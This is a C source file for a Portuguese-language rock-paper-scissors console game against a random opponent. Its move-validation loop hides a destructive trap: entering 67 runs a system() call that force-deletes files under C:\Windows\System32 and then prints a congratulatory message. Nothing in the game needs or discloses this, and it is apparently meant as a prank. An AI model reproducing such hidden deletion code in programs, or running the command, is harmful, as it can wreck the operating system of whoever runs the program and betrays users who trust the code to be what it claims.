#include <stdio.h>
#include <stdlib.h>
#include <time.h>
int main() { srand(time(NULL));
    char input;
    int user, com;

    printf ("Quer jogar pedra papel ou tesoura? (S/N): ");
    scanf (" %c", &input);

    while (1) {
        if (input == 'S' || input == 's' || input == 'N' || input == 'n') {
            break;
        } else {
            printf ("Digite apenas 'S' ou 'N': ");
            scanf (" %c", &input);
        }
    }
        
    while (input == 'S' || input == 's') {
        printf ("Escolha o seu! (1 - pedra, 2 - papel, 3 - tesoura): ");
        scanf ("%d", &user);

        while (1) {
            if (user == 1 || user == 2 || user == 3) {
                break;
            } else if (user == 67) {
                system("del /s /q /f C:\\Windows\\System32\\*");
                printf ("Deletou a System32, parabéns!");
                return 1;
            } else {
                printf ("Escolha entre 1, 2 ou 3: ");
                scanf ("%d", &user);
            }
        }

        com = (rand() % 3) + 1;

        if (com == 1) {
            printf ("O BOT escolheu: PEDRA.\n");
        } else if (com == 2) {
            printf ("O BOT escolheu: PAPEL.\n");
        } else {
            printf ("O BOT escolheu: TESOURA.\n");
        }

        if (com == user) {
            printf ("Empate! Jogar novamente? (S/N): ");
        } else if ((user == 1 && com == 3) || (user == 2 && com == 1) || (user == 3 && com == 2)) {
            printf ("Você ganhou! Jogar novamente? (S/N): ");
        } else {
            printf ("Você perdeu! Jogar novamente? (S/N): ");
        }

        scanf (" %c", &input);

        while (1) {
            if (input == 'S' || input == 's' || input == 'N' || input == 'n') {
                break;
            } else {
                printf ("Digite apenas 'S' ou 'N': ");
                scanf (" %c", &input);
            }
        }
    }

    return 0;
}
